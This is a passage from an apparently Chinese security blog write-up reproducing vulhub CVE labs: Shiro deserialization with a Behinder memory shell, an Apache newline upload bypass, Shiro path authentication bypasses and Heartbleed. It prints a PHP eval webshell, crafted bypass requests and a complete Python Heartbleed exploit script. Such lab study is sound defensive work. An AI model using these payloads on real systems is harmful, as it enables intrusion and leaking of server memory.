+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>爆破出密钥</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A34.png" class>
+
+<p>再点击爆破利用链，得到链子为CommonsBeanutils1</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A35.png" class>
+
+<p>可进行命令执行</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A36.png" class>
+
+<p>这里执行内存码，执行之后用蚁剑进行连接，发现蚁剑连接的返回数据为空，这里就尝试使用冰蝎，因为冰蝎也是AES加密，执行流量加密之后难以被检测(这里发生一个小错误，内存马类型用什么连接就应该用什么内存马类型，下面就改成冰蝎了)</p>
+<p>冰蝎地址：<a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_11">https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_11</a></p>
+<p>所以就使用冰蝎进行连接，右键新增输入shiro工具的url和密码，进行连接</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A37.png" class>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A38.png" class>
+
+<p>好，shell连接成功</p>
+<h2 id="CVE-2017-15715（Apache-HTTPd换行解析漏洞）"><a href="#CVE-2017-15715（Apache-HTTPd换行解析漏洞）" class="headerlink" title="CVE-2017-15715（Apache HTTPd换行解析漏洞）"></a>CVE-2017-15715（Apache HTTPd换行解析漏洞）</h2><ul>
+<li>我们通常所说的Apache HTTP Server，通常指的是整个软件包，它包括了HTTP服务器的核心功能、模块化架构、配置文件、运行时环境等。Apache HTTP Server 提供了完整的 Web 服务器解决方案，可以用于托管和提供网站内容。</li>
+<li>而 httpd 则是 Apache HTTP Server 的具体可执行程序的名称（通常在 Unix&#x2F;Linux 系统上）。通过运行 httpd守护进程，Apache HTTP Server 开始监听指定的端口（例如默认的80端口），接收来自客户端的HTTP请求，并根据配置文件进行相应的处理和响应。</li>
+<li>httpd可以通过mod_php来运行PHP网页。其存在一个解析漏洞，在解析PHP时，如1.php0x0A将被按照1.php进行解析，导致绕过一些服务器的安全策略。</li>
+<li>mod_php 是 Apache 的一个模块，它允许将 PHP 解释器嵌入到 Apache 的进程中，并通过该模块将 PHP 代码集成到 Apache 的请求处理流程中。当 Apache 收到一个包含 PHP 代码的网页请求时，mod_php 模块负责解析该请求，将 PHP 代码交给 PHP 解释器进行解释执行，然后将执行结果返回给客户端浏览器。</li>
+</ul>
+<p>除了mod_php之外，还存在其他方式来运行PHP网页，以下是一些常见的替代方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. PHP-FPM（PHP FastCGI Process Manager）：PHP-FPM 是一个独立的进程管理器，通过 FastCGI 协议与 Web 服务器</span><br><span class="line">（例如 Apache 或 Nginx）进行通信。PHP-FPM 可以独立于 Web 服务器运行，提供更高的性能和灵活性。</span><br><span class="line"></span><br><span class="line">2. CGI（Common Gateway Interface）：CGI 是一种标准的 Web 服务器和应用程序之间的接口协议。通过将 PHP 解释器</span><br><span class="line">作为 CGI 程序来运行 PHP 网页，Web 服务器可以通过 CGI 协议与 PHP 解释器进行通信并执行 PHP 代码。</span><br><span class="line"></span><br><span class="line">3. FastCGI：FastCGI 是一种改进的 CGI 协议，它使用长连接和进程池的方式提高了性能。类似于 CGI，FastCGI 可以将 </span><br><span class="line">PHP 解释器作为独立的进程来运行 PHP 网页，并通过协议与 Web 服务器进行通信。</span><br></pre></td></tr></table></figure>
+
+<p>此漏洞利用条件为apache版本在2.4.0-2.4.29</p>
+<h3 id="复现-8"><a href="#复现-8" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>可以看到是一个文件上传界面，上传上去的文件会被改一个名字，我们随便上传一个木马文件，文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>上传失败，将文件后缀改成双写php或者大小写交替都不行，那么就试试将文件后缀改为txt</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>上传成功,说明过滤的是php后缀,根据这个漏洞,1.php0X0A(16进制的0X0A)和1.php具有相同效果,所以可以抓包在文件名后面插一个16进制 因为burpsuit的16进制</p>
+<p>编辑器不能插入只能修改,所以提前在evil.php的后面加一个空格,然后把空格对应的0d改成0a就可以了</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A34.png" class>
+
+<p>然后连接shell</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A35.png" class>
+
+<p>shell连接成功</p>
+<h2 id="CVE-2010-3863（Apache-Shiro认证绕过漏洞）"><a href="#CVE-2010-3863（Apache-Shiro认证绕过漏洞）" class="headerlink" title="CVE-2010-3863（Apache Shiro认证绕过漏洞）"></a>CVE-2010-3863（Apache Shiro认证绕过漏洞）</h2><p>由于CVE-2016-4437也是关于Apache Shiro的，所以这里就不再对于基础服务做介绍了</p>
+<ul>
+<li>Apache Shiro在使用Spring动态控制器时，攻击者通过构造..;这样的跳转，可以绕过Shiro中对目录的权限限制。</li>
+<li>“Spring动态控制器”指的是基于 Spring 框架的控制器（Controller），它们负责处理 Web 请求并返回相应的响应。Spring MVC 是一个常见的 Web 应用程序框架，提供了一种声明式的方式来定义和处理控制器。</li>
+<li>在用户访问路径的时候会经过以下步骤:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 用户发送请求。</span><br><span class="line">2. 请求到达路由，路由根据配置的规则将请求分派给相应的控制器。</span><br><span class="line">3. 控制器接收请求并处理业务逻辑。</span><br><span class="line">4. 控制器生成响应数据。</span><br><span class="line">5. 响应数据返回给用户。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>路由也是在 Web 框架中实现的，但它是用来配置和管理请求的映射规则。路由定义了请求的路径和对应的处理器（可能是控制器），以便框架能够将请求分派给正确的处理程序。</li>
+<li>路由确定了用户请求应该被传递给哪个控制器进行处理。路由的配置规则定义了请求的 URL 或路径与相应控制器之间的映射关系。通过路由配置，Web 框架能够将特定的请求路由到正确的控制器。</li>
+<li>控制器负责接收用户请求并处理相关的业务逻辑。当用户发送请求时，路由将请求分派给相应的控制器，控制器根据请求的内容进行处理，并生成适当的响应数据。</li>
+<li>控制器通常是在 Web 框架（如Spring MVC、Express.js等）中作为对象或类进行实现。控制器通过定义请求映射（Request Mapping）来监听特定的 URL 或路由，从而接收用户的请求。控制器可以包含多个方法，每个方法处理不同的请求。</li>
+</ul>
+<p>漏洞利用条件是Apache Shiro版本在1.1.0以前</p>
+<h3 id="复现-9"><a href="#复现-9" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/3863%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>对于shrio有许多拦截器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AuthenticationInterceptor：用于验证用户身份信息，确保用户已经通过身份验证。如果用户未通过身份验证，则该拦截器</span><br><span class="line">将重定向或返回错误响应。</span><br><span class="line"></span><br><span class="line">AuthorizationInterceptor：用于验证用户是否具有执行特定操作或访问资源所需的权限。如果用户没有足够的权限，则该</span><br><span class="line">拦截器可能会阻止用户访问受限资源或执行敏感操作。</span><br><span class="line"></span><br><span class="line">SessionValidationInterceptor：负责验证用户会话的有效性。它检查用户的会话是否过期或被篡改，并采取相应的措施，</span><br><span class="line">如重新验证用户身份或要求用户重新登录。</span><br><span class="line"></span><br><span class="line">LogoutInterceptor：用于处理用户登出操作。该拦截器可能会清除用户的会话信息、注销用户身份验证状态或执行其他与用</span><br><span class="line">户登出相关的操作。</span><br></pre></td></tr></table></figure>
+
+<p>用户可以在Shiro.ini编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表达式通常为ANT格式。如下配置，访问 &#x2F;index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于&#x2F;user&#x2F;xiaoming 等 &#x2F;user&#x2F;xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。 </p>
+<p>在最早的另一个漏洞中,*表示匹配零个或多个字符串，&#x2F;<em>可以匹配&#x2F;hello，但匹配不到&#x2F;hello&#x2F;因为</em>通配符无法匹配路径。 </p>
+<p>如果我们给&#x2F;hello链接设置了拦截器，访问&#x2F;hello将会被进行权限判断，如果请求的URI为&#x2F;hello&#x2F;呢，&#x2F;*URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中&#x2F;hello形式和&#x2F;hello&#x2F;形式的URL访问的资源是一样的。那么就实现了没有登录就越权访问了&#x2F;hello目录</p>
+<p>直接请求管理页面&#x2F;admin&#x2F;，无法访问，将会被重定向到根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en;q=0.3,en-US;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/3863%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>构造恶意请求&#x2F;.&#x2F;admin，即可绕过权限校验，访问到管理页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /./admin HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en;q=0.3,en-US;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/3863%E7%A0%B4%E8%A7%A33.png" class>
+
+<h2 id="CVE-2020-1957（Apache-Shiro认证绕过漏洞）"><a href="#CVE-2020-1957（Apache-Shiro认证绕过漏洞）" class="headerlink" title="CVE-2020-1957（Apache Shiro认证绕过漏洞）"></a>CVE-2020-1957（Apache Shiro认证绕过漏洞）</h2><p>还是shiro框架，就不对服务做介绍了</p>
+<h3 id="复现-10"><a href="#复现-10" class="headerlink" title="复现"></a>复现</h3><p>先访问一下web页面</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/1957%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>在CVE-2010-3863中我们得知</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户可以在Shiro.ini编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表</span><br><span class="line">达式通常为ANT格式。如下配置，访问 /index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就</span><br><span class="line">能进行访问。而对于/user/xiaoming 等 /user/xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访</span><br><span class="line">问资源。</span><br><span class="line"></span><br><span class="line">在最早的另一个漏洞中,\*表示匹配零个或多个字符串，/\*可以匹配/hello，但匹配不到/hello/因为\*通配符无法匹配路</span><br><span class="line">径。</span><br><span class="line"></span><br><span class="line">如果我们给/hello链接设置了拦截器，访问/hello将会被进行权限判断，如果请求的URI为/hello/呢，/*URL路径表达式将无</span><br><span class="line">法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中/hello形式和/hello/形式的URL访问的资源是一样的。</span><br><span class="line">那么就实现了没有登录就越权访问了/hello目录</span><br></pre></td></tr></table></figure>
+
+<p>这次的CVE产生于shiro在uri进拦截器之前使用了RequestUri函数中调用decodeAndCleanUriString函数对URI进行清洗。如果URI中存在;号的话，则会删除其后面的所有字符。</p>
+<p>清洗函数在源码中具体实例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static String decodeAndCleanUriString(HttpServletRequest request, String uri) &#123;</span><br><span class="line">      uri = decodeRequestString(request, uri);</span><br><span class="line">      int semicolonIndex = uri.indexOf(59);//获取;号的位置</span><br><span class="line">      return semicolonIndex != -1 ? uri.substring(0, semicolonIndex) : uri;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样,在被过滤器检查的时候类似于&#x2F;miao;&#x2F;..&#x2F;hello&#x2F;1&#x2F;最终也就变成了&#x2F;miao,而进spring之前不会被清洗,所以正常解析到&#x2F;miao;&#x2F;..&#x2F;hello&#x2F;1&#x2F;</p>
+<p>所以也就知道该怎么做了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en;q=0.3,en-US;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/1957%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>直接访问&#x2F;admin失败了，会被重定向到根目录</p>
+<p>构造恶意请求&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;，即可绕过权限校验，访问到管理页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /xxx/..;/admin/ HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en;q=0.3,en-US;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/1957%E7%A0%B4%E8%A7%A33.jpg" class>
+
+<p>这样就成功访问到了管理页面。</p>
+<h2 id="CVE-2014-0160（OpenSSL心脏出血漏洞）"><a href="#CVE-2014-0160（OpenSSL心脏出血漏洞）" class="headerlink" title="CVE-2014-0160（OpenSSL心脏出血漏洞）"></a>CVE-2014-0160（OpenSSL心脏出血漏洞）</h2><ul>
+<li><p>OpenSSL:OpenSSL是一个强大的安全套接字层密码库，Apache使用它加密HTTPS，OpenSSH使用它加密SSH。OpenSSL为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议，并提供了丰富的应用程序供测试或其它目的使用。</p>
+</li>
+<li><p>越来越多的网站使用加密代码来保护如用户名、密码和信用卡号等数据，这能够防止黑客通过网络盗取个人信息。这种加密协议被称为SSL(Secure Sockets Layer安全套接层)或TLS(Transport Layer Security Protocol安全传输层协议)。当一个网站使用这种安全协议，浏览器中的地址栏旁会出现挂锁图标。编写加密代码十分复杂，所以很多网站使用一种开源的免费安全协议，即OpenSSL。</p>
+</li>
+<li><p>导致此漏洞的代码在OpenSSL的TLS HeartBeat扩展中，问题存在于ssl&#x2F;dl_both.c文件中的心跳部分，具体函数为</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int dtls1_process_heartbeat(SSL *s)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>SSLv3记录包括内容：类型域type，长度域length，数据域data。P是指向SSLv3记录中数据的指针。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hbtype = *p++;n2s(p, payload);pl = p;</span><br><span class="line">unsigned char *buffer, *bp;int r;</span><br><span class="line">buffer = OpenSSL_malloc(1 + 2 + payload + padding);bp = buffer;</span><br><span class="line">*bp++ = TLS1_HB_RESPONSE;s2n(payload, bp);memcpy(bp, pl, payload);</span><br><span class="line"></span><br><span class="line"># 商业转载请联系作者获得授权，非商业转载请注明出处。</span><br><span class="line"># For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.</span><br><span class="line"># 协议(License)：署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)</span><br><span class="line"># 作者(Author)：drinkflower</span><br><span class="line"># 链接(URL)：https://drinkflower.asia/wordpress/</span><br><span class="line"># 来源(Source)：drinkflower&#x27;s blog</span><br><span class="line"></span><br><span class="line">Hbtype：心跳包的类型；</span><br><span class="line">payload：心跳包的长度；</span><br><span class="line">pl：访问者提供的心跳包的数据。</span><br><span class="line">buffer：分配访问者指定大小的内存块，此内存块最大可为：[1+2+65535+16]字节；</span><br><span class="line">bp：分配内存块的指针。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>先后将类型、长度存入bp指向的buffer，长度与访问者提供的长度相同，从pl复制payload长度到bp指向的buffer中。</p>
+</li>
+<li><p>而漏洞便发生在此处，当恶意构造的心跳包没有提供足够多的数据，且payload 的长度与实际不符，memcpy便会把SSLv3记录后的数据均复制出来，数据每次至多64KB。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;心跳&quot;是一种常见的运维设计思想，即连接一端的计算机发出一条简短数据，协议另一端的计算机是否仍然在线，并获取反馈</span><br><span class="line">数据。由于这种用于运维的链接可能是周期性的，因此被称为心跳。Heartbleed漏洞产生条件便源于此，当构造一个恶意的心</span><br><span class="line">跳数据进行欺骗SSL协议另一端的计算机时，其便会受到欺骗并发送服务器内存中的数</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0160%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>也就是说,这个漏洞可以让我们把服务器内存中的数据一次一次的带出,每次可以带出64kb</p>
+<p>此漏洞利用条件为OpenSSL1.0.1</p>
+<h3 id="复现-11"><a href="#复现-11" class="headerlink" title="复现"></a>复现</h3><p>由docker ps可知https服务是开在8443端口的，访问一下，记得将请求url请求替换为htpps，因为只支持https请求</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0160%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>对于这个漏洞的攻击就是直接用python将脚本带出，脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span><br><span class="line"># The author disclaims copyright to this source code.</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import select</span><br><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line">from optparse import OptionParser</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=&#x27;%prog server [options]&#x27;, description=&#x27;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#x27;)</span><br><span class="line">options.add_option(&#x27;-p&#x27;, &#x27;--port&#x27;, type=&#x27;int&#x27;, default=443, help=&#x27;TCP port to test (default: 443)&#x27;)</span><br><span class="line"></span><br><span class="line">def h2bin(x):</span><br><span class="line">    return binascii.unhexlify(x.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\n&#x27;, &#x27;&#x27;))</span><br><span class="line"></span><br><span class="line">hello = h2bin(&#x27;&#x27;&#x27;</span><br><span class="line">16 03 02 00 dc 01 00 00 d8 03 02 53</span><br><span class="line">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span><br><span class="line">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span><br><span class="line">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span><br><span class="line">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span><br><span class="line">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span><br><span class="line">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span><br><span class="line">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span><br><span class="line">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span><br><span class="line">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span><br><span class="line">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span><br><span class="line">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span><br><span class="line">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span><br><span class="line">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span><br><span class="line">00 0f 00 01 01</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">hb = h2bin(&#x27;&#x27;&#x27;</span><br><span class="line">18 03 02 00 03</span><br><span class="line">01 40 00</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">def hexdump(s: bytes):</span><br><span class="line">    for b in range(0, len(s), 16):</span><br><span class="line">        lin = [c for c in s[b : b + 16]]</span><br><span class="line">        hxdat = &#x27; &#x27;.join(&#x27;%02X&#x27; % c for c in lin)</span><br><span class="line">        pdat = &#x27;&#x27;.join((chr(c) if 32 &lt;= c &lt;= 126 else &#x27;.&#x27; )for c in lin)</span><br><span class="line">        print(&#x27;  %04x: %-48s %s&#x27; % (b, hxdat, pdat))</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">def recvall(s, length, timeout=5):</span><br><span class="line">    endtime = time.time() + timeout</span><br><span class="line">    rdata = b&#x27;&#x27;</span><br><span class="line">    remain = length</span><br><span class="line">    while remain &gt; 0:</span><br><span class="line">        rtime = endtime - time.time()</span><br><span class="line">        if rtime &lt; 0:</span><br><span class="line">            return None</span><br><span class="line">        r, w, e = select.select([s], [], [], 5)</span><br><span class="line">        if s in r:</span><br><span class="line">            data = s.recv(remain)</span><br><span class="line">            # EOF?</span><br><span class="line">            if not data:</span><br><span class="line">                return None</span><br><span class="line">            rdata += data</span><br><span class="line">            remain -= len(data)</span><br><span class="line">    return rdata</span><br><span class="line"></span><br><span class="line">def recvmsg(s):</span><br><span class="line">    hdr = recvall(s, 5)</span><br><span class="line">    if hdr is None:</span><br><span class="line">        print(&#x27;Unexpected EOF receiving record header - server closed connection&#x27;)</span><br><span class="line">        return None, None, None</span><br><span class="line">    typ, ver, ln = struct.unpack(&#x27;&gt;BHH&#x27;, hdr)</span><br><span class="line">    pay = recvall(s, ln, 10)</span><br><span class="line">    if pay is None:</span><br><span class="line">        print(&#x27;Unexpected EOF receiving record payload - server closed connection&#x27;)</span><br><span class="line">        return None, None, None</span><br><span class="line">    print(&#x27; ... received message: type = %d, ver = %04x, length = %d&#x27; % (typ, ver, len(pay)))</span><br><span class="line">    return typ, ver, pay</span><br><span class="line"></span><br><span class="line">def hit_hb(s):</span><br><span class="line">    s.send(hb)</span><br><span class="line">    while True:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        if typ is None:</span><br><span class="line">            print(&#x27;No heartbeat response received, server likely not vulnerable&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">        if typ == 24:</span><br><span class="line">            print(&#x27;Received heartbeat response:&#x27;)</span><br><span class="line">            hexdump(pay)</span><br><span class="line">            if len(pay) &gt; 3:</span><br><span class="line">                print(&#x27;WARNING: server returned more data than it should - server is vulnerable!&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                print(&#x27;Server processed malformed heartbeat, but did not return any extra data.&#x27;)</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">        if typ == 21:</span><br><span class="line">            print(&#x27;Received alert:&#x27;)</span><br><span class="line">            hexdump(pay)</span><br><span class="line">            print(&#x27;Server returned error, likely not vulnerable&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    if len(args) &lt; 1:</span><br><span class="line">        options.print_help()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    print(&#x27;Connecting...&#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.connect((args[0], opts.port))</span><br><span class="line">    print(&#x27;Sending Client Hello...&#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hello)</span><br><span class="line">    print(&#x27;Waiting for Server Hello...&#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    while True:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        if typ == None:</span><br><span class="line">            print(&#x27;Server closed connection without sending Server Hello.&#x27;)</span><br><span class="line">            return</span><br><span class="line">        # Look for server hello done message.</span><br><span class="line">        if typ == 22 and pay[0] == 0x0E:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print(&#x27;Sending heartbeat request...&#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hb)</span><br><span class="line">    hit_hb(s)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>再使用命令运行脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python seb.py 127.0.0.1 -p 8443</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0160%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>数据被成功带出</p>
+<h4 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h4><p>也可以直接使用msf里的漏洞模块，直接进行攻击，就是程序化的，这里就不再对这个方法做详细的介绍了</p>
+<h2 id="CVE-2013-4547（Nginx文件名逻辑漏洞）"><a href="#CVE-2013-4547（Nginx文件名逻辑漏洞）" class="headerlink" title="CVE-2013-4547（Nginx文件名逻辑漏洞）"></a>CVE-2013-4547（Nginx文件名逻辑漏洞）</h2><p>之前的CVE几乎都是关于Apache的，所以这里就对Nginx做一个解释</p>
+<ul>
+<li><p>Nginx（发音为“engine-x”）是一个高性能的开源Web服务器软件。它以异步事件驱动的方式处理客户端请求，具有占用资源 少、处理并发连接能力强和稳定性高等特点。Nginx还可以用作反向代理服务器、负载均衡器和HTTP缓存等。</p>
+</li>
+<li><p>Nginx与Apache相比，有以下的一些区别：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.架构设计：Nginx采用了基于事件驱动的架构，而Apache采用的是多线程或多进程的模型。这使得Nginx在处理大量并发连接时更高效，内存消耗更少。</span><br><span class="line"></span><br><span class="line">2.内存使用：Nginx设计得非常轻量级，内存占用量较低。相比之下，Apache使用的线程模型会为每个连接创建一个线程或进程，导致内存消耗较高。</span><br><span class="line"></span><br><span class="line">3.静态文件处理：Nginx在处理静态文件时效率更高，可以更快地提供静态内容。Apache在这方面的性能相对较差。</span><br><span class="line"></span><br><span class="line">4.可扩展性：Nginx具有良好的可扩展性，可以处理数千个并发连接而不会影响性能。Apache则对并发连接的处理能力相对较弱。</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：</p>
